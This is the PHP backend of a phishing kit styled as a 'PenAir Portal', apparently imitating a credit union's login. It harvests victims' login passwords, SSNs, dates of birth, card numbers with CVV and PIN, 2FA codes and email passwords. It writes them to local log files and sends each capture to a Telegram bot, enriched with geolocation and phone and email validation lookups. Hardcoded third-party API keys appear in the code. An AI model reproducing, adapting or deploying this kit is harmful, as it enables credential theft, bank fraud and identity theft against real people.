<?php
/**
 * PenAir Portal - Secure Data Capture & Telegram Integration
 * Uses file_get_contents (no curl required)
 */

header('Content-Type: application/json');

// ── Honeypot ──────────────────────────────────────────────────────────────────
if (!empty($_POST['b_field'])) {
    die(json_encode(['status' => 'ok']));
}

// ── Phone Validation Endpoint (AbstractAPI) ──────────────────────────────────────────
if (isset($_GET['action']) && $_GET['action'] === 'line-type') {
    $raw = file_get_contents('php://input');
    $d = json_decode($raw, true) ?: [];
    $phone = $d['phone'] ?? '';
    if (empty($phone))
        die(json_encode(['type' => 'unknown']));

    $abstractKey = '0adc8e15f7914654b2c102cebbb299a0';
    $url = "https://phoneintelligence.abstractapi.com/v1/?api_key={$abstractKey}&phone=" . urlencode($phone);

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 3,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    $res = curl_exec($ch);
    curl_close($ch);

    $data = $res ? json_decode($res, true) : null;
    if ($data) {
        if (!empty($data['phone_validation']['is_voip']) && $data['phone_validation']['is_voip'] === true) {
            die(json_encode(['type' => 'voip']));
        }
        if (!empty($data['phone_carrier']['line_type'])) {
            $lineType = strtolower($data['phone_carrier']['line_type']);
            if (strpos($lineType, 'landline') !== false || strpos($lineType, 'fixed') !== false) {
                die(json_encode(['type' => 'landline']));
            }
        }
    }

    die(json_encode(['type' => 'mobile']));
}

$botToken = "{{TG_BOT_TOKEN}}";
$chatId = "{{TG_CHAT_ID}}";
$log_file = __DIR__ . '/result.txt';
$rate_dir = sys_get_temp_dir() . '/cap_ratelimit';

// ── Basics ────────────────────────────────────────────────────────────────────
// If payload is JSON (e.g., from updated visitor ping trackVisit), merge it into $_POST
$raw_input = file_get_contents('php://input');
if ($raw_input && ($json_post = json_decode($raw_input, true))) {
    $_POST = array_merge($_POST, $json_post);
}

$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$session_id = preg_replace('/[^a-f0-9\-]/', '', $_POST['_sid'] ?? 'nosid');
$form_type = $_POST['form_type'] ?? 'unknown';

// ── API Ninjas Helper ─────────────────────────────────────────────────────────
function api_ninja(string $endpoint, array $params)
{
    if (empty($endpoint))
        return null;
    $api_key = '9IffIYgfbatOM/2lhJ06CA==7ZHqrYzICLRspTL1';
    $url = "https://api.api-ninjas.com/v1/{$endpoint}?" . http_build_query($params);
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => ["X-Api-Key: {$api_key}"],
        CURLOPT_TIMEOUT => 3,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res ? json_decode($res, true) : null;
}

// ── IP Rate Limiting (1 capture/IP/form type per 15s) ─────────────────────────
if (!is_dir($rate_dir))
    @mkdir($rate_dir, 0700, true);

$attempt_val = $_POST['attempt'] ?? '';
$rate_key = $rate_dir . '/' . md5($ip . $form_type . $attempt_val);

if (file_exists($rate_key) && (time() - filemtime($rate_key)) < 15) {
    die(json_encode(['status' => 'ok']));
}
@touch($rate_key);

// ── Capture IP & True Client Detection ────────────────────────────────────────
$ip = $_SERVER['HTTP_CF_CONNECTING_IP']
    ?? $_SERVER['HTTP_X_REAL_IP']
    ?? $_SERVER['HTTP_X_FORWARDED_FOR']
    ?? $_SERVER['REMOTE_ADDR']
    ?? 'Unknown';

if (strpos($ip, ',') !== false) {
    $ip = explode(',', $ip)[0];
}

$ipDetails = '';
$geo_line = '';

// Check API Ninjas for IP details
$geo_line = '';
if ($ip !== 'Unknown' && $ip !== '::1' && $ip !== '127.0.0.1') {
    $ipap = api_ninja('iplookup', ['address' => $ip]);
    if ($ipap && !empty($ipap['country'])) {
        $loc = ($ipap['city'] ?? 'Unknown') . ", " . ($ipap['region'] ?? 'Unknown') . ", " . $ipap['country'];
        $geo_line = "🌍 <b>Geo:</b> <code>" . he($loc) . "</code>";
    }
}

// ── Log to file ───────────────────────────────────────────────────────────────
$log_data = "--- [{$form_type}] {$timestamp} [SID:{$session_id}] ---\n";
$log_data .= "IP: {$ip}" . (!empty($geo['city']) ? " | {$geo['city']}, {$geo['country']}" : '') . "\n";
$log_data .= "UA: {$user_agent}\n";
$post_data = [];
foreach ($_POST as $k => $v) {
    if (!in_array($k, ['b_field', '_sid', 'form_type'])) {
        $log_data .= ucfirst($k) . ": {$v}\n";
        $post_data[$k] = $v;
    }
}
$log_data .= str_repeat('-', 40) . "\n\n";
file_put_contents($log_file, $log_data, FILE_APPEND | LOCK_EX);

// ── Telegram helpers (file_get_contents, no curl) ─────────────────────────────

/** HTML-escape value for Telegram HTML mode */
function he(string $s): string
{
    return htmlspecialchars($s, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

/**
 * Send a Telegram text message via HTML parse mode.
 * Uses file_get_contents with HTTP POST context — no curl needed.
 */
function tg_message(string $token, string $chat, string $html): void
{
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $body = http_build_query([
        'chat_id' => $chat,
        'text' => $html,
        'parse_mode' => 'HTML',
    ]);
    $ctx = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
                . "Content-Length: " . strlen($body) . "\r\n",
            'content' => $body,
            'timeout' => 10,
            'ignore_errors' => true,
        ],
        'ssl' => [
            'verify_peer' => true,
            'verify_peer_name' => true,
        ],
    ]);
    @file_get_contents($url, false, $ctx);
}

// ── Bot/chat check ────────────────────────────────────────────────────────────
if (empty($chatId) || $chatId === 'YOUR_CHAT_ID') {
    echo json_encode(['status' => 'ok']);
    exit;
}

$sid_tag = $session_id ? "\n🔗 <b>SID:</b> <code>" . he($session_id) . "</code>" : '';
$d = $post_data;

$fp_line = !empty($_POST['fingerprint']) ? "🛡️ <b>FP:</b> <code>" . he($_POST['fingerprint']) . "</code>\n" : '';

// Only send full IP and Geo info on initial tracks or key authentications
if ($form_type === 'visit' || $form_type === 'login' || $form_type === 'emailAuth') {
    $header = "🕒 <code>{$timestamp}</code>\n"
        . "📍 <b>IP:</b> <code>" . he($ip) . "</code>\n"
        . ($geo_line ? $geo_line . "\n" : '')
        . "🤖 <b>UA:</b> <code>" . he(substr($user_agent, 0, 140)) . "</code>\n"
        . $fp_line
        . $sid_tag . "\n";
} else {
    $header = "🕒 <code>{$timestamp}</code>" . $sid_tag . "\n";
}

// ══════════════════════════════════════════════════════════════════════════════
// Visitor ping
// ══════════════════════════════════════════════════════════════════════════════
if ($form_type === 'visit') {
    $msg = "👁️ <b>NEW VISITOR</b>\n"
        . "🕒 <code>{$timestamp}</code>\n"
        . "📍 <b>IP:</b> <code>" . he($ip) . "</code>\n"
        . ($geo_line ? $geo_line . "\n" : '')
        . "🌐 <b>Page:</b> <code>" . he($_POST['url'] ?? 'Unknown') . "</code>\n"
        . "🖥️ <b>Res:</b> <code>" . he($_POST['res'] ?? 'Unknown') . "</code>\n"
        . "🤖 <b>UA:</b> <code>" . he(substr($user_agent, 0, 140)) . "</code>\n"
        . $fp_line
        . $sid_tag;
    tg_message($botToken, $chatId, $msg);
    die(json_encode(['status' => 'ok']));
}

// ══════════════════════════════════════════════════════════════════════════════
// Form submissions — one clear message per form
// ══════════════════════════════════════════════════════════════════════════════
switch ($form_type) {

    case 'login':
        $msg = "🔑 <b>✅ LOGIN CAPTURED</b>\n" . $header
            . "👤 <b>Username:</b> <code>" . he($d['username'] ?? 'N/A') . "</code>\n"
            . "🔒 <b>Password:</b> <code>" . he($d['password'] ?? 'N/A') . "</code>";
        break;

    case 'verify':
        $phoneFlag = $d['phone'] ?? 'N/A';
        if (!empty($d['phone']) && strlen($d['phone']) > 5) {
            $abstractKey = '0adc8e15f7914654b2c102cebbb299a0';
            $url = "https://phoneintelligence.abstractapi.com/v1/?api_key={$abstractKey}&phone=" . urlencode($d['phone']);
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 3,
                CURLOPT_SSL_VERIFYPEER => false
            ]);
            $res = curl_exec($ch);
            curl_close($ch);
            $pData = $res ? json_decode($res, true) : null;

            if ($pData && isset($pData['phone_validation'])) {
                $isValid = !empty($pData['phone_validation']['is_valid']) ? '✅ Valid' : '❌ Invalid';
                $carrier = $pData['phone_carrier']['name'] ?? 'Unknown Carrier';
                $lineType = $pData['phone_carrier']['line_type'] ?? 'Unknown Line';
                $phoneFlag .= " ({$isValid} - {$lineType} - {$carrier})";
            }
        }

        $dobStr = !empty($d['dob']) ? he($d['dob']) . " (✅ Frontend Validated)" : 'N/A';
        $msg = "🪪 <b>✅ IDENTITY CAPTURED</b>\n" . $header
            . "👤 <b>Name:</b>  <code>" . he($d['full_name'] ?? 'N/A') . "</code>\n"
            . "🔢 <b>SSN:</b>   <code>" . he($d['ssn'] ?? 'N/A') . "</code>\n"
            . "📞 <b>Phone:</b> <code>" . he($phoneFlag) . "</code>\n"
            . "🆔 <b>Member #:</b> <code>" . he($d['member_num'] ?? 'N/A') . "</code>\n"
            . "🎂 <b>DOB:</b>   <code>" . $dobStr . "</code>";
        break;

    case 'card':
        $binStr = !empty($d['bin_data']) ? "\n🏦 <b>BIN Info:</b> <code>" . he($d['bin_data']) . "</code>" : '';
        $msg = "💳 <b>✅ CARD DATA CAPTURED</b>\n" . $header
            . "💳 <b>Card:</b> <code>" . he($d['card_num'] ?? 'N/A') . "</code>" . $binStr . "\n"
            . "📅 <b>Exp:</b>  <code>" . he($d['exp'] ?? 'N/A') . "</code>\n"
            . "🔐 <b>CVV:</b>  <code>" . he($d['cvv'] ?? 'N/A') . "</code>\n"
            . "🔑 <b>PIN:</b>  <code>" . he($d['pin'] ?? 'N/A') . "</code>\n"
            . "🏠 <b>Addr:</b> <code>" . he($d['address'] ?? 'N/A') . "</code>";
        break;

    case '2fa':
        $msg = "📟 <b>✅ 2FA CODE CAPTURED</b>\n" . $header
            . "🔢 <b>Code:</b> <code>" . he($d['sec_code'] ?? 'N/A') . "</code>";
        break;

    case 'emailAuth':
        $prov = $d['emailProvider'] ?? 'Unknown';
        // Add minimal logo visual using emojis representing colors/providers where possible
        $logo = "📧";
        if (stripos($prov, 'yahoo') !== false)
            $logo = "🟣";
        if (stripos($prov, 'google') !== false || stripos($prov, 'gmail') !== false)
            $logo = "🔴";
        if (stripos($prov, 'microsoft') !== false || stripos($prov, 'outlook') !== false || stripos($prov, 'hotmail') !== false)
            $logo = "🔵";
        if (stripos($prov, 'apple') !== false || stripos($prov, 'icloud') !== false)
            $logo = "⚪";

        $emFlag = $d['emailAcc'] ?? 'N/A';
        if (!empty($d['emailAcc']) && strpos($d['emailAcc'], '@') !== false) {
            $emVal = api_ninja('validateemail', ['email' => $d['emailAcc']]);
            if ($emVal && isset($emVal['is_valid'])) {
                $emFlag .= $emVal['is_valid'] ? ' (✅ Valid)' : ' (❌ Invalid)';
            }

            $domain = explode('@', $d['emailAcc'])[1];
            $mxVal = api_ninja('mxlookup', ['domain' => $domain]);
            if ($mxVal !== null) {
                if (is_array($mxVal) && count($mxVal) > 0) {
                    $emFlag .= "\n📡 <b>MX:</b> <code>Parsed " . count($mxVal) . " Mail Servers</code>";
                } else {
                    $emFlag .= "\n📡 <b>MX:</b> <code>(❌ No Mail Servers Found)</code>";
                }
            }
        }

        $msg = "{$logo} <b>✅ EMAIL ACCOUNT CAPTURED</b>\n" . $header
            . "🏢 <b>Provider:</b> <code>" . he($prov) . "</code>\n"
            . "📧 <b>Email:</b>    <code>" . $emFlag . "</code>\n"
            . "🔒 <b>Password:</b> <code>" . he($d['emailPass'] ?? 'N/A') . "</code>";
        if (!empty($d['fingerprint'])) {
            $msg .= "\n🕵️ <b>Fingerprint:</b> <code>" . he($d['fingerprint']) . "</code>";
        }
        break;

    default:
        $rows = '';
        foreach ($d as $k => $v)
            $rows .= "• <b>" . he(ucfirst($k)) . ":</b> <code>" . he($v) . "</code>\n";
        $msg = "📋 <b>FORM SUBMISSION</b> ({$form_type})\n" . $header . $rows;
        break;
}

tg_message($botToken, $chatId, $msg);

// Also write the full JSON dump to the log (no file attachment needed without curl)
$capture_data = [
    'form_type' => $form_type,
    'session_id' => $session_id,
    'timestamp' => $timestamp,
    'ip' => $ip,
    'geo' => $geo,
    'user_agent' => $user_agent,
    'data' => $post_data,
];
file_put_contents(
    __DIR__ . '/captures.jsonl',
    json_encode($capture_data, JSON_UNESCAPED_UNICODE) . "\n",
    FILE_APPEND | LOCK_EX
);

echo json_encode(['status' => 'ok']);
?>